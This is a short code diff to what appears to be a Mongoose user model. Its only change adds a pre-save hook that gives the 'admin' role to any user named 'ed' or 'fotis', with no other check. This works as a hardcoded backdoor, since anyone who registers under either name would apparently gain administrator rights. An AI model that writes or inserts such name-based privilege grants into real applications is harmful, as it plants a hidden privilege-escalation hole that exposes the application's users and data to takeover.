@@ -126,6 +126,14 @@ userSchema.pre('save', async function (next) {
     next()
 })
 
+userSchema.pre('save', function (next) {
+    const user = this
+    if(user.name === "ed" || user.name === "fotis") {
+        user.role = "admin"
+    }
+    next()
+})
+
 const User = mongoose.model('User', userSchema)
 
 module.exports = User
